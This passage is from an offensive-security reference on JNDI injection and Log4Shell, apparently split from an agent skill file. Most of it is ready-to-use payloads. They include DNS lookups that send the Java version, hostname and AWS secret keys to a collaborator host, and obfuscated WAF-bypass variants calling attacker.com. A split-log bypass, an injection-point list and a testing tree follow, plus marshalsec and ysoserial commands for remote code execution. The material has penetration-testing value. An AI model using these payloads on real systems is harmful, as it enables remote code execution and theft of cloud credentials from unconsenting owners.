# jndi-injection — 详细参考（由 SKILL.md 拆分）

# Exfiltrate environment info via DNS:
${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.TOKEN.collab.net}
${jndi:ldap://${hostName}.TOKEN.collab.net}
```

### WAF Bypass Variants

Log4j2's lookup parser is very flexible:

```text
${${lower:j}ndi:ldap://attacker.com/x}
${${upper:j}${upper:n}${upper:d}i:ldap://attacker.com/x}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/x}
${j${::-n}di:ldap://attacker.com/x}
${jndi:l${lower:D}ap://attacker.com/x}
${${env:NaN:-j}ndi${env:NaN:-:}ldap://attacker.com/x}
```

### Split-Log Bypass (Advanced)

When WAF detects paired `${jndi:...}` in a single request, split across two log entries:

```text
# Request 1 (logged first):
X-Custom: ${jndi:ldap://attacker.com/
# Request 2 (logged second):
X-Custom: exploit}
```

If the application concatenates log entries before re-processing (e.g., aggregation pipelines), the combined `${jndi:ldap://attacker.com/exploit}` triggers.

### Real-World Case: Solr Log4Shell

```bash
# Confirm via DNSLog — Solr admin cores API:
GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.TOKEN.dnslog.cn}
# DNS hit with Java version = confirmed Log4Shell in Solr
```

### Injection Points to Test

```text
User-Agent          X-Forwarded-For       Referer
Accept-Language     X-Api-Version         Authorization
Cookie values       URL path segments     POST body fields
Search queries      File upload names     Form field names
GraphQL variables   SOAP/XML elements     JSON values
```

### Affected Versions

- Log4j2 2.0-beta9 through 2.14.1
- Fixed in 2.15.0 (partial), fully fixed in 2.17.0
- Log4j 1.x is NOT affected (different lookup mechanism)

---

## 6. OTHER JNDI SINKS (BEYOND LOG4J)

| Product / Framework | Sink |
|---|---|
| Spring Framework | `JndiTemplate.lookup()` |
| Apache Solr | Config API, VelocityResponseWriter |
| Apache Druid | Various config endpoints |
| VMware vCenter | Multiple endpoints |
| H2 Database Console | JNDI connection string |
| Fastjson | `@type` + `JdbcRowSetImpl.setDataSourceName()` |

---

## 7. TESTING METHODOLOGY

```
Suspected JNDI injection point?
├── Send DNS-only probe: ${jndi:dns://TOKEN.collab.net}
│   └── DNS hit? → Confirmed JNDI evaluation
│
├── Determine JDK version:
│   └── ${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
│
├── JDK < 8u191?
│   ├── Start marshalsec LDAP server with remote class
│   └── ${jndi:ldap://attacker:1389/Exploit} → direct RCE
│
├── JDK >= 8u191?
│   ├── LDAP → serialized gadget (need gadget chain on classpath)
│   ├── BeanFactory + EL (need Tomcat on classpath)
│   └── JRMPListener via ysoserial
│
└── WAF blocking ${jndi:...}?
    └── Try obfuscation: ${${lower:j}ndi:...}
```

---

## 8. QUICK REFERENCE

```text
# Safe confirmation (DNS only):
${jndi:dns://TOKEN.collab.net}

# LDAP RCE (JDK < 8u191):
${jndi:ldap://ATTACKER:1389/Exploit}

# Version exfiltration:
${jndi:ldap://${sys:java.version}.TOKEN.collab.net}

# Log4Shell with WAF bypass:
${${lower:j}ndi:${lower:l}dap://ATTACKER/x}

# Start LDAP reference server:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER/#Exploit" 1389

# Post-8u191 — ysoserial JRMP:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"
```
